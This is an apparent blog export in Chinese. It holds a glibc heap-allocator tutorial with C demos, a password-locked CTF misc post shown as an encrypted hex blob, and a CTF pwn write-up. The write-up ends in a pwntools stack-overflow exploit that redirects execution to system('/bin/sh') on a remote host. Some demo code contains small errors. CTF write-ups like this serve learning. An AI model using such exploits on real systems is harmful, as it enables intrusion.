进程调用free(C)以后，C对应的虚拟内存和物理内存一起释放如图11-(6)。 总结： 我们申请动态内存空间，实质上是由brk或mmap函数来完成的 申请的动态内存空间实质上是Arena区域的一个chunk，并且我们申请的大小只不过是user_content并不是整个chunk的大小 chunk在使用时和空闲时分别有着对应的状态，两者有着差别 堆的生长空间是从低地址到高地址 0x04 Free机制 还记得文章开头的程序代码吗？我问了一个问题：程序代码中有什么问题吗？ 下面就来看看上述代码有没有问题。给我们申请的内存赋值50个字符串后，我们再调用free函数，这个时候看一下chunk中的情况，如下图： 图12 从图中看到，在free之后，chunk的结构发生了变化，但是除了fd和bk部分的数据改变以外，其他的数据并没有发生改变，那么在free之后我们是否能将剩下的数据打印出来呢？下面写个程序验证一下： 123456789101112131415#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;int main(int argc,char* argv[])&#123; char *ptr; ptr = malloc(50); memcpy(ptr,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb",50); // 48*"a"+"b" printf("[*] Before free chunk:"); puts(ptr); free(ptr); printf("[*] After free chunk:"); puts(ptr+16); return 0;&#125; 运行结果如下： 12[*] Before free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb[*] After free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb 可以看出虽然我们free了chunk，但是我们仍然可以通过指针来访问chunk上的数据，所以说在free之后，我们一定要将指针置0，如下程序： 12345678910111213141516#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;int main(int argc,char* argv[])&#123; char *ptr; ptr = malloc(50); memcpy(ptr,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb",50); // 48*"a"+"b" printf("[*] Before free chunk:"); puts(ptr); free(ptr); ptr = NULL; printf("[*] After free chunk:"); puts(ptr+16); return 0;&#125; 运行结果如下： 12[*] Before free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbSegmentation fault 可以看出在打印free后的chunk情况时发生了段错误，因为puts中的参数为0x10c，是内核地址，所以不能访问。 敲黑板！敲黑板！敲黑板！这里再提出一个问题：free后的chunk去哪了？我们再次申请同样大小的chunk，会返回什么指针？这里先解决第二个问题：在free chunk后，再次申请同样大小的chunk，这时返回用户的指针是什么呢？下面还是用程序进行验证： 12345678910111213141516#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;int main(int argc,char* argv)&#123; char *ptr0,*ptr1; ptr0 = malloc(50); memcpy(ptr0,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb",50); // 48*"a"+"b" free(ptr0); printf("[*] The address of chunk0:%p\n",ptr0); ptr = NULL; printf("[+] ptr0 = NULL\n"); ptr0 = malloc(50); printf("[*] The address of chunk1:%p\n",ptr1); return 0;&#125; 运行结果如下： 123[*] The address of chunk0:0x5652b84e52a0[+] ptr0 = NULL[*] The address of chunk1:0x5652b84e52a0 从上面的结果可以看出我们第一次和第二次返回的指针相同，也就说明我们两次申请的动态内存空间是同一个空间，这是什么原因呢？下面就一步一步来解决这个问题：在堆释放后，为了充分利用chunk，系统并不会立即收回chunk，而是把chunk放到一个地方，如果程序中再次申请同样大小的chunk时，会直接将该chunk的地址返回，这里说的地方就是存放空闲chunk的链表结构bins，这里涉及的结构体就是malloc_state，如下是它的源码： 1234567891011121314151617181920212223242526272829303132struct malloc_state&#123; /* Serialize access. */ __libc_lock_define (, mutex); /* Flags (formerly in max_fast). */ int flags; /* Set if the fastbin chunks contain recently inserted free blocks. */ /* Note this is a bool but not all targets support atomics on booleans. */ int have_fastchunks; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; 从上面的源代码可以看出，bins由两个数组构成分别是：FastbinsY[NFASTBINS]和bins[NBINS * 2 - 2]，通过查阅相关代码，可以知道FastbinsY[]中有一个容器：fastbin，bins[]由三个容器：unsorted bins、small bins和large bins。系统会根据空闲chunk的大小和处于的状态，会将空闲的chunk放在上述4个不同的bins中。注：在libc.2.26以上的动态链接库中又增加了一个Tcache机制，在这里就不展开了。 1.FastbinsY[] fastbins 该数组主要包含的是fastbins数据结构，它主要用于提高小内存的分配效率，默认情况下对于size_sz为4B的平台，小于64B的chunk分配请求；但对于size_ze为8B的平台，小于128B的chunk分配请求，首先会查找fastbins中是否具有所需大小的chunk存在，如果存在则直接返回； 我们也可以把fastbins看作为small bins的一个cache，默认情况下，对于相同大小的链表上，fastbins只缓存small bins的前7个大小的chunk（Tcache也只缓存fastbins或smallbins的前7个大小的chunk），该结构的特点还有： 没有bk指针，也就是说它是一个单链表结构 prev_inuse标志位一定为1，也就是说fastbins chunk不会和其他chunk进行合并 采用LIFO （先进后出）策略 fastbins的结构如下图： 图13 2.Bins[] 该数组中存放的是unsorted bin、small bins和large bins，这三个bin均是双链表结构，均可以发生合并，并且一共有126个bins，分别被划分为： bin[1]：Unsorted bin bin[2-63]：small bins bin[64-126]：large bins 下图是三个bins的结构图： 图14 Unsorted bins Unsorted bins可以看成small bins和large bins的cache，其中只有一个Unsorted bin，并且是以双链表管理空闲的chunk，并且在unsorted bin中的chunk不进行排序，所有的chunk在回收时都要先放到unsorted chunk中（对于高版本的libc，会先放到Tcache中）。那么在分配时，也就是再次申请动态内存时，如果unsorted bin中没有合适的chunk，就会把unsorted bin中的所有chunk分别加入到所属的bin中，然后再在bin中分配合适的chunk，bins数组中的元素bin[1]用于存储unsorted bin的chunk链表头。 Small bins ptmalloc使用small bins管理空闲小的chunk，每个small bin中的chunk的大小与bin的index有关，计算公式如下：chunk_size = 2*size_sz*index，small bins和faste bins的大小有一部分是重叠的，其实当发生Consolidate时，fastbin中的堆块在一定情况下可以进入到small bin中。 Large bins 在size_sz为4B的平台上，大小等于512B的空闲chunk或者在size_sz为8B的平台上，大小等于1024B的空闲chunks有large bins管理。Large bins一共包含63个bin，每个bin中的chunk大小不是一个固定公差的等差数列，，每组bin的数量依次为32，16，8，4，2，1，公差依次为64B、512B、4096B、32768B、262144B。 三个bin的大小对比 如下图： 图15 在讲完free相关的知识点后，我们应该清楚了，在free我们申请的动态内存后，系统并不会及时的收回，而是将空闲的chunk放入对应的链表结构中，等下次再申请相同大小的内存空间时，就无需再进行系统分配，而是直接将空闲的chunk返回，这样就极大的提高了堆的工作效率，下面我们通过一个示例代码来说明这一点，不过要说明的是，因为我的链接库是用的lib-2.30，如下图： 图16 所以在分配chunk时采用了tcache机制，关于这个机制我就不在展开，只需要知道当一个Tcache链表装满了7个，再有对应的chunk被free，就会被放到相应的链表结构中，示例代码如下： 1234567891011121314151617181920212223242526272829#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main()&#123; char *c,*a,*b,*d,*e,*f,*g,*h,*i,*j; char *o; a = malloc(300); // 1 b = malloc(300); // 2 c = malloc(300); // 3 d = malloc(300); // 4 e = malloc(300); // 5 f = malloc(300); // 6 g = malloc(300); // 7 h = malloc(300); // 8 i = malloc(300); // 9 j = malloc(300); // 10 o = malloc(300); // 11 free(a); free(b); free(c); free(d); free(e); free(f); free(g); free(h); free(i); free(j); return 0;&#125; 在示例代码中，我们一共申请了11个300B大小的chunk，释放了10个chunk，按理说释放的前7个chunk被放到了Tcache中，因为是300B，所以后面三个会被放到Unsorted bin中，下面来验证我们的猜测，结果如下图： 图17 有的同学可能会对上图产生疑问：Unsorted bin明明只有1个chunk块，不是应该有3个吗？是的，的确是一个chunk块，但是大家看一下该块的size是0x3c0，那么就是0x140+0x140+0x140的结果，可以看出，本来三个chunk被合并了1个chunk，这里面涉及了Unlink机制，限于本篇篇幅，这个知识点就不在这展开了，有兴趣的同学可以自行学习，我在后期也可能单独拿出来介绍，因为这个知识点在漏洞利用时还挺重要。 还记得前面学习到的prev_inuse位吗？在上面的Unsorted bin中我们就可以感受到该标志位，如下图： 图18 如果标志位是1的话，那么size的大小应该为0x141，所以在这里标志位置为0了。注意：一定要明白只有在双链表结构中，并且发生Unlink时，标志位才会发生改变。 0x05 总结 有关堆的入门很难，因为我的知识有限，所以只能先帮助大家了解到这里了，而且也不能保证本文没有错误，所以还希望有兴趣的同学可以自己再去看看其他的资料，自己多动手操作一下，以帮助自己的理解，谢谢！ 0x05 Reference [1] Linux堆内存管理深入分析（上） [2] Browse the source code of glibc/malloc/malloc.c [3] 进程分配内存的两种方式–brk() 和mmap()（不设计共享内存） [4] Syscalls used by malloc. [5] Does malloc() use brk() or mmap()?]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-misc类型题目总结]]></title>
    <url>%2F2020%2F07%2F12%2F2020.07.12%EF%BC%88135%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Hey, password is required here. c0b876c68ce8db4db0f2c5b16525afa2120afc55a2908d3322993c0be48c66eea98792901880c8466344c44217b8155245b9c97fbf56caeec538fba2091d2fb1d44e09e20b8cdbdee5be6350e1ed3a9ec590acbeffabf613ab20db6d5c1cb38b57ffc0ff870bd64a59d98382f942ba3212e7f7a5386a19166af01f12a34921daa0f3f6da3f96aea2bfac19fffc6650f573c5e9e7d7c215111b530660463f3bfabec4e27c4232e739ec05a738e8cee95d24780134dd31c6a366ca0cc82e18c9e5c87d52965fbe10fd5579b033df16f0acd7f02f5711f2a73bf56ff93fab2224a5404fc63eb0fd6fa525127b5486f3c221c47752020457ad08b22c4424191553667b97f515f47201f5b325e5ae36af9d830cc996d352c2e9807b009af628ada336576337d32a5a0a07a490c1820e59ffa3aa8a9ca27319188efd967ca8a67582b64ea9628a35280c65088f521629e399a3f62680b2beb3550df265af60538193222ed2deb595fdf842a46ccd6ece97b8869c29342ad243cd805350ff135e2d6d7ccd9e34cdddc1ca5c34139f048db62ae75ca268ad9efba9526a838ae863acaccb124e3f219283575958588b48507f9da915657e310226013170f9ed0003b8674fa9f326c36693ea57b1dfa57268d6858c80a56cd07d6ae8f6cb65fbe11b8730bbdb44ef12e6eb32e06a31aa543452b3d00e27b76541e210bcbe9486bcd0c01753a76782a0a4552878bf6279bdfcd254d2533e89bc2352f8b6027e6501a973e65781964c58be7e776c39e01aad805faef40226577b75df9285dadb98f88bcb5ab5ea71b9c54693e8f212c57a2f71f3eb1774577ccf9d2e65c3e1cbd64243a39a417506cca5e08632a1d375fbc8bca80c24e48ed272ac0c6adc9ac1e34be234519540865895d2067dcc2562e7b881fdd1923e4b1b2e6cd3e972a226423fa34534f9a19151d25cf4fd2f2e58020585d13f826614055f39d67ad4f907056c68cc6c2cba4c7a90f24965a5b940b130aa0bc793c8de0509a4a2beed27253f7e2f835c565879b422932bd4a871936626178daf9569242d79180cd45d3572c805867dd10ccf5fa66a23efb3dd609032f4389394f7935d5ad337461899e98e672a241aa457718c8645530a3db92706150c6e000f51df64c070e836ac4a27a19672a798c2451a0d2bcdcb64c70450875d96e4f8847edd69aea2d605385f624379011c8669693cf85ec44c6ae53ac4535f430a85e061304cd5d449af361dccbc9044d6781664e87aab78067113a88bfad750c63918ec460b06835a1fa60738b1818ad1e9e790a94c45fd89f8e2f13231fddc150eb61ea5ca58090142ddf86bc05b7185748b0bf939131fff34b6d70ba5fcb7dbb8d25b12a3b6a6ca5d22c86cd63ade4fb765591ba43fe42b250c4371e74e57389adba4297d1dbb855606e6be2124fbe0d53e7f424db5ca37c8c61d413f5ff9b5daf6fef0af6906256ebc3c648539b9b94cc11d0bc4cda758955cda10053fc923d1fd86259e6c3bb5367924ebfe8983e7191ff67379b418662a858070807f963fe6c6e4a2fa8cc5fa6088900eaaeb3f63ab031ae184154e1781a8601c59cb864fbdfeb5833b43b621268842133108e21aaacfa88462387187b9794f67443ccef38d30a41f794867b1b289a8096947b36c5281e6f861eabb0ce10578b69710fd28c19472d9ef1a7c59086c0658b566a9ba89c1e4778196e52d21af6d58f53bec1e858024932454556b2a2bc2e44a19e50af587cc7e71ffff766fd64cd6f1cc59d46c978d0ada0609a0ee1fb8952094d64567cb887336b3d696a3bd5703554db3befe697a61f38f92534fa2fb87a02ea3aa1441dbd495981c2dd8266a7d961ca92c10c25c3d8ae1288047e0c29914e55320cfd48e7369572e0116f31c84e9862a50e46dc390a35e25920de3f1d00e327da087ae547b0a1ac8c47ee5580ebba876e01036f07cc32a35b4010306096f876da41a8c7d9be239221587153d6b813b91b7ae0b83424e0469e7832110f6b3ab09a2268595e0f23303d52f1a5e92804b19bac1d8a80c81f12f4143b57e8a20436fc9534f46184268633fb12de2c98861e5b441aa78bc0b661c0242eba907257403488bc57d0a95cb485d011969bf051bcc896595d2bc661deb4eb0d3d1bda071db274fefecc276d96058981c152fafd6f457a4f0214c8ddefd12addbc8963c7500c3e824ca3a853bbe3979b53a5a5b5fa7583efb24268bf9627999cdec41c0ff55c500c134e44529b1f8d7a13c799f6be08d9ea26f5a09f076bc9b78cbb0e66997c7386d68a2b4110329833f3e47d247b5482facffc65526a680f46c9f0f0100fb632616d1ab41cbf6cc597587b619e591e25594661b2df57644a3183bda14f9df55175d3717f10ba4b8580fede394ece155f59b6e7caa057a8588e7d34ee3d901f5a42d27bd4990a4eefc0e4ef63a2976d8182d1fa0acd04901e223a772ffb24d4a50542d1eb5a0cead0f0aea48c7da58865de278a353c9dbc217cf6a268c2f032a17ea23b4e5c397c58d416c188e73b81c69e17234890ae4d13cc9f2576840a7825f6182cf31549e5a7873493df5bced8e32b2c38780bac7546b08fe925fbf647dc10afc5660e182d488663aa02f868a9fb4247e8a701c63f9f0125b68395736e969ac6bea844b8bcff43ce8f989d9ee50885c1cb1a01eb25ae70952f8e065528480897d1034cec516bc725d235bec8cdaf51fed1577747977434e4e78869bc64ddbbcb864a7009254754b7aac4dfaf2236a7554b4f9631eae7b9b1207f3af63372f9a735b2a1539b59980ee370902bf51b9877e41f886b2f5fbd59ebb40f894e51daea58ba5b829953f620a51536afdf3030437c804a51321909d2284eeb32391a782563aa12854a5f3485d3389f2bc712bd046db50959b404ae68a538bdf377c32a61f0f41b9d94ba67cdc6ab690e76719fe82b56f31ec4bfdd57785b72382c284460077159affab8259d98c56084a5277a914347ad501040fc24d9c87ddac472fae2ecb0ad80bbe3325410748c2b582917dacec39533c3e09e7e6f0ad35cc084d1029becfff8d6d9a676fc6f97a8a0b38daf1ded848a3c649c3ec62f0e78f2d1a225dd40eb0230f733eda044ad42a4fa83499ed8eb24ece4f88cd2a089988c8433e559508bde79759f4a1b4d9c17faea4590b4f95db545996f08cd631bf6e6b2b6984b1278947f40bac178b035363589c69e5ecb9f71bb03016052e73eef2db1f83c669b64851f69aeb2d46f8eea757d18f4c824c180f9f76d61d94b9630b8bcb7ca81184a9e37996af28d107aad06db4fe3b7af22c815ebd5315e0b9e3816dcefa40b2b6c0d996f1160879a33b19f780e20f50da19c8d70c03d12fe975950ff6b19378c0156801f995b200ac281367178941d935e25813f39595f7c26ac3e30de4cd41526ca8e574314d01872eae12e7b08f0f4a26e9db12c8ea2952f7e5e5e6fd16ab29766a70c8bf8b095ef32c24a2679037ed499535546a8a3be55b79eb84eabb95773f3f85514c2d7f786b0b9c7f530fa40d2767b256d1182ad906625315a666af493a24b1ce665654c97d7e7eff1271c657e9c2a73156921e9daa3777d7c63da4f9be2e12646dbca48c42dad41b0af4211da774e63073088a20e9dca40ec2ce0ebec932521f79cd125d48c5917febbe583db430494b792ff57b906f0fe412cd333738122ee0749ef42b731df7660d3015646506d6144b238fb3d519ae4e62f60c143e83155a8daaf202ee5c46a0e20bf46ee1e169958f33ae0805fe8e9efb1c5f86040c6978104dd85c2f1c36927d1bd4fb82472190c7d7f35bda89e6f46181724c651ff7f3c2624c51646ace66fc90e48d7c9255888158e7f01496fe732396c402f6886cb44697d083cea93c7ad171eb8aa192e9ec6d6db5b9057736ce9d26e49a350be78157a46c7ba62c166445397cb064f139e4f207281d7aaeb32b155382032e78c5f4a8554619e3f8652e30aded3beaced7c4c0c38a1bd74c688338f143b9d34e88af52735341ca58c8b264db061dbffbfd849e6a607db83ca94a85e753f3c5e1baf698c2940527b7008f33001567a0d411e079b61655d76de17e71bd78e40dff671cfb36465cff5329839b4495a3be3013d52f02de3d15a7a337d3dbb9fb7169f374d3c07554ff0699b9c599051583aeaf47ba9030f8b7116d7e299930e31663b09344d04c103f7c3c6389ede4def35ed42602e5ced47161e38bc40691bfb694bd82b12187445350bf8b47a78fe233d67289d6a86aa935eea114946a5facf5f489ac3478a1f4fb74a6cbde9b027d952274fdb3f892762a60ef80a4e8a6d7549721444b7cd401e365d8ad22c3cc740799f6822cf3fbd0f9e1cceb12557cceba1ee5c4f042768abcf7a0520d383618ff0b9ee8698638bbd47eed91fab6175cd4d6359df7fb7e4e80fe6815cd385007d726ec73ebbf3520543c9274f0d8833c92a638dc51e83b7765deb577c7a41f589a56e8f899e5c1aa4c12e6d4695902ff790cc27eab7f9f67c9019c8a3fdde309fabb580c532b27047b1c2a154f1b9dd60aa4e758782776a26d5379d1051f93650fd56d0b71e34a692d2c2da91bcf5c349c002297d9025895fdb9288236f36b18a9f27e2e66209037cf5753029d0d451edb5b7aa7ce487fb6387b16e2875f3c08fbe9051b6eb432afd4da58f872441b717dcb1a0485429d7d58613adebe05f4f4c6782d8492e4d10e721f5dbe37b4bbc5d8aa3ff665ff704e0d845be138fbe86c7806788b3e2f67996c35b9a862ca9623a0fd9b554e8714192163c7d4f7e5e3db518345919d7cc925aeaae19226e762c6eb59dd3c5dc1a802990843f085d215b5c5d523fcfd68d7895b40167dc2aaefa7eec4f068fb60d76992733f3d95d594ce3e034308e89d2b7776bdf3adea52a33c1ec1f85a87a0c00dbed26ee548216cbfa8ef34e1cf49f745e4d4780c7773aad8e2ffcff4baa80a639c4bc1035d663417c10388c0d77abe8bba9ff738e7c4cb216d31c924e2438ef42841efe4f6771e4a8b19a847e6944d900752344b821500fdc3592621263e63cd8ac866c15df16c4768a3b51a44c53eb6f5b6a2191dd70b9d1974cc886282e68c385442111d7ff9b970f5b60bb9a84b18c5f931194286d62b7e22aee6acbc34435d1f796191a9da609dc40535efe89503bbe16b0dafbc47ea706ebbe17bf748142b68c29b128b9d9cda6dcb89d748a5577ad24230f2e2d961ea354d8660d2233cf9092845674c9acd7e63e10afd1796fdf098f9b08ff1b920698dab2856efd603637b485a5053c6a5e314827a4757c33f6eb8a106bdd61e0dc77f684a9267f14138e5e8d841c6a8ec3b9bd5663ca53bb10cb8f8bd03815b1ec07d41ff3d478be5f8ae9cb73f60087be5c40cf3a00000ea2353212b2e120e9e8cd620518d323958f13d97029a82daaafdd97e581e7096f9076d06d7b7a3e7cf37c27f292894e25b1a131a6ad4ef780cc6672b3071176d0feb7a89ee47929dfddf4cc3908545d776d41eecd96fc8d2b05714b6c4063e75ad4b0da0d2a45585e3adad7f8842a0ac0b2c3e2fcea6c0b6df7d6eb64424e703e3132bf60e7c7531a0e8ea5055107abe9571ba81b5b6d67df2b515d2fa8cdc5ff17cfe3cc1f4bb711adc5de7073d3963211ee8a95bdb4718183fd672f6bbd24e51ad8bc32c469c2bd82f6c54e2dbd3a600525292c4349b146fef766272700d4869fe7f5a45f853ae1037c84e2afc7d6f47c6cc710fb13546537e80835ac296a419b1310e84a607974cc692b628a2b8cb7e859eb3eee610ab4ca6ea8a4bc6a019457dc4a347220547160384f33db52b512cd8645506fb5b5fdac2927541604202b8d08f2a0c567432ae718206161dff5a9919f2e66a837122e6bedd712de43e7d9620ea68e7e224d7240c6ac50d4d7602bfea7f7d460f5b48b21d9a2c536fbfe27af900ebeb80b4e1717fe08b083ee4c1f9244514e0f54391fa4448af14bd81be95afaf16f4f0cc749c5c5e9b830a549937ae610b86eed9582281391d32ca1677cf038bbab0b37489835be58639b9e684cd629a4c88426392515cf1010c34434b48ce48895bfc8b6da897916aedbe14bec14aa4b70a73c41c33706050e4fa5bd1d6c07847603f060bb3a4ac4a2dce2a2866343d8e9681432d28e59048255cdac0d1a12b881e04ff7ef59f1b3bd2cf84673921f1468fd481a7b06fd6fd053b1e60c6aae15d2132bbd33c76d0ffcda5518a784bd283927d9c3a328916b5c4eb9cbaa16cfa3f671237b80ada9943f5dc8b19b571a56bbcd517b3ee7466938607d5f8e4dad802c2cd40594d95a1f5ab793b7d2104b46e50c6595e31fe5f738be75e13447ee0e36bcc7dbf604d454d02e13165dd376dbde4fbe039d6a158fd2971336833591ef6fe21acca48283d227605d23e59ff3b7018e60529de68d8e03d9961acd8ad480b3cf7c2a8240961e9b5cbc5d9c22e2ce0ed5ad2539b79972a306a7771ebb0c50e73324676f77b1fd58da48334f77498e1d0b6f4233bfe95ce8a5d4015e97f957a9d12698bc5ed9970d44eae2d029733561e0299b8103a1f377d8c2043ae469f30b0b542bcee169cddf793eb2183e391fd7fef05d4cb54f2f73e5c73944fcb4ee35281473ddd1654c41dfc9e8eb5bad04655c35b1cc2bba3bef092c9cacd0fd61e704bef63238d2bb6a3c54c816be6651e00148989b4f5dae84619b9d536d8237cfda19e9d65653f16e116bd836ba8ab9809cd3e1f3673122fd196ed114e98ac8873c4c1659949ca136835476c4da7e4abbde04b848ebc8a1f7ddd75f19641ed99e5047fdd76ab0f8990f150f60d59257c6d90474f3a58e814356c06a4079340f05b1544a563ed05a6ba6484f31cb3a399a63168219b5d938fe65fdb1fa4b8ecabac707cd59001875f99d568ff707af1715c2f070b192285e7dd9c043cd80044ba6adc0c9fccc12429bd7afaf8d32dbd17b116bea2611c56765f11094c03106ff1e147b6217ea4284b412633485d1d21cda5c4f800f3cc6a43c9ac0066dae259620aed33bb2530b8c4e8ae926475d57205c60edb63210d544eb89510e4380dc932d64e12becf1102c95913003c2e75cb0578e34074bd3e7835fdb33153dc52b4883de7a786763f14203abbe197658a755e2edea8842780b21a3ce7121d23b25170b9bd25b8a676bbf1bc1cbcfe76cc586842586e98b964cdee80ffea1b442c6945673b809ed95f55c8c1d844fa6a34f2396234956f60a9be01ceec7799955134640802d1a8790b11b22fe745f08022a0a1bd765d1d38b75ee02ccb370c321ec9271771c77c22e2c4d7140886858e26314f54eaf301c83b7b04dc3f92af6b5a05351db37b68a0587b1e9ba08a31190090d16c5a4f496542dd69838324f199bad09fec94ac57d5d9669f12efcf9852fa442301091af8bb7f303d7ef3e749075d8ff0ad419d4a00a3fb2bd0d2f1c9482f669a86a066cf27379958ab6b45cd6eac00c616d3e9f72975f1fdbd57244788b144d7a7547fe13fa56aed1559e8136f959f0aedc99a046789d6cb01a183814cb71f7e17663a916017d866b26f588fab4f00ab864d67f0390d5d6a87d57b6d041a4ec78380992f43946502e49d02d5a8f9edc11526271b2029dbfc146d9b67aa2864c624a557323717c301363064a462a24ebfb03ec8eebccd7641bdcc803ef8299f6fd0a606b19799de59515bfe2c50a021370bfa1cf5885306b8303b4bc564f4cc21d82af7f762b24a59cc32dfb42680d9cf93157d6c0aeebaf4afbe2d72aebc135bf35afea40b9c4e4aec1a1a958a74fe99e528acdee887b4ed65ba75e8d6c9b2662789202f4576c3d4658db705a0219d9e3c78801929ce8eaf2045c821c6fd912f7aafe7a9016f0f9a56609ddc940f16f4542bb8888da8f5db2d2a05350bb70d5dcb6f76d9c294388157a6470878b31e7f9c2692143beccdf920f4d9cac4f1957dff6385af5fb63fb97b31c64cdfa61e6005e8d233e47c1a56e7a87fa57b51c8118cc1f8834330c1c56bef7cfc19d102476345150c40d806525ff3f05ca6ed68133ddacaea52885f7a490f7fb1443384b1ad469f9237dcb603a9e07e738c74fdb4f40254fefb12cde3f58c2943f9388ef04355bcca2d93007a7702de6453a5b62478ea32813140ca7e426d1084dd0359046fb1b593a9eb320b148b7ec5c19f8a6ae732c43414fcbbd7099d591ad91f2477862145e1eda1f5414dbe60adc5234e58aefb67f815b25bb9a5e9bfde1daf641a29e9f6f756da23337839e81520090ccfab7590227054d73b5dca0a0d4019f83278825cbb04fd879d6586f54e7b7991e1ef97648c51461fd6def785bb900cac9e1f12f5f991d3f76e018e38e7df9baef49ec6625d56e549756589020e8a0802fc72f1666350413d0c69592337624cfbbbf05ec4d5f2febe721ff238f0018ca703de1ac8e10185e117ac0f423b6e5b8c3b012d7dc5532f11ad7233abfadb7ba941a9835818250ab18be65687dd2ed30b41032dfcab5ed039d60d3ff339d5a278f87e13cd9b44aa39fcb754e280f306c503d2c58ffc2cf4462e4a72406f6cc5fed6b6d48536cfa5a909c7fd1455249d1c58640a69ee8efe46038f9347dba3fc21fd436a7c6d92209e3d495d9fc3d615d34ca91bc2676b7679093cff2b86fc0d8711238c74532a534773c691eb6834761a179249fdf81551c10b22f4b6a86db4931002aa9227ca7818b722d8d9e8a8679d61656656bc88a5ef9b93244f32f7de4a140f1b961ee9d95c53da5a6085e679b4b7eb83b68073ceafb01ffc4327239e4d7246a640b84d8391d42a302b4c9d9ed1790ffcad19ab6202779b63ba1bb03f86b6316c29568f65e4f5b6c68d7361845e12a0df8efacff32e13afa4d753449ed6c36faa4918341a31d6ca62894da3f315f9afbe50d17015054e1a2a3845c924ee8486985e87727bb02c90544a1219ff5460500875f2e36549b7e57209fb80d4389f9d0c23096f55a98285921c3a124aeeea04a3f333df38c195c5690b07fb484c367ac23b6bea8a1e3a3667d35c155808af2136a351e21c043e949cf6dc9dd9fc51ca92c6e988387ab58a2603c2ec0c4b5fdc0d9c2984201af251cd74e7f8097dceddb9bdac1aa3afd7744d87221fb0860ac743a9e42ecdc44dcc47cef2ecca9f41e8f3f92f4a423abd18808c776f126e0f498c7afb662d5972593f505c0de45a9eac5529f9648b82de2e8e3cf2722522c8430c560fb3b67a6c9383985a5cfa6e1639e0b02e202ec78d214a0dabc9bd4b21eb9b8de63a50e577fe1eaa61f1e4ca1495d7ca7a235527251fa6f75e1b83a1e619e88845b66f3f2d47ca632569c6f911b66f8b81c4ac2447b7d36b765651f0209d7b4f5369c215ad40ab21c5b8c34fc90b95ff67174e21f82b72946a73458c7d75a25b82c1bf638022b20576ae70ba86b5812a5f24dcdc8d68d358f4e48003e912f37c0a9014e3319646bc3515b4ada08a32aff05fb21106522087f0cf7b58c6c2ded960dec280fa806c05185fc8dabd9767a28377193418c0738c62d8444bdaa06a6c610e9181eed5f9cee418f58310b59462871df9c21a52a7a7c97ddb2de28364658bd029bbf170f233d16ac45b56361b9010ef848815c0f166efe80defdcb0a86be8694a8b7d7d933b393a8c42e338d710bddf87ea925e79065abfa538c3f35a0dee39bb51178d49720a38c0fb8977f1230619ea96ed59518115d91e7bb7f06acbe6cd1e0572954e571e28133b3f0db20a5952ff2bcc35001205119b847a11af1b82fcb8185d65c7d185f5946d24321224a50f50cc0215f5f69c89e729fa943fb290bbeae40e1bcd8923ff817253149733512b6ed9f4d465f180a0bfc0f5f90d6c6aff83179b57dc860766ba63aed663e8c6370ba61f943492eb135cee76abe9d7b029418191a39cc17774910a2d3d6e412ed8c83fae94050aadf949ba5c49ae7526d99a109b65efc35dc9b3073a6188f8]]></content>
  </entry>
  <entry>
    <title><![CDATA[【看雪CTF-pwn】一鸣惊人的栈溢出]]></title>
    <url>%2F2020%2F07%2F04%2F2020.07.04%EF%BC%88134%EF%BC%89%2F</url>
    <content type="text"><![CDATA[这道题目真的太坑了，不过也给我提了一个醒，就是在做题时不能对IDA pro反编译的伪代码过于相信，在感觉有问题的地方，一定自己用GDB调试一下，否则就会陷入一个自我反省和懊恼的循环中，下面这道题目就是，下面我将用两种姿势来获取flag。 0x00 准备工作 123# file ymjr ymjr: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped 可以看出该文件是32位的ELF文件 12345678# checksec ymjr [*] &apos;/root/Documents/CTF/PWN/Kanxue/1/pwn/YMJR/ymjr&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 该ELF文件只开启了栈不可执行保护 从上图的IDA中可以看出，gets()函数中的变量v4在栈中被分配的空间为0x64，但是在后面的exp.py文件中构造成功了，但是没有成功得到flag，于是我去gdb中调试了一下，如下图： 从上图中可以看出，v4距esp的距离有0x1c，esp中的地址为0xffffd860，那么v4的地址为0xffffd87c。这个时候ebp中地址为0xffffd8e8，那么v4与ebp的距离为0xffffd8e8-0xffffd87c=108（0x6c），示意图如下： 0x01 姿势一 直接让返回地址跳转到system(&quot;/bin/sh&quot;)处 我们先看看程序中有没有可以直接利用的shell，在IDA中查找一下，发现在secure()函数中发现了system(&quot;/bin/sh&quot;)，如下图： 那么我们是否可以将main函数的返回地址填充为system(&quot;/bin/sh&quot;)函数的地址呢？下面我们来进行尝试我们开始写exp，不过请放心，我会详细的介绍每一步： 12345678910111213from pwn import *r = remote("221.228.109.254",10002)context(log_level="debug")shell_addr = 0x804863A# 把返回地址中填充secure_addr地址payload = b'a'*108 # v4空间的填充payload += b'a'*4 # old ebp的填充payload += p32(shell_addr) # 返回地址填充为secure的地址r.sendlineafter("There is something amazing here, do you know anything?",payload)r.interactive() 执行结果如下： 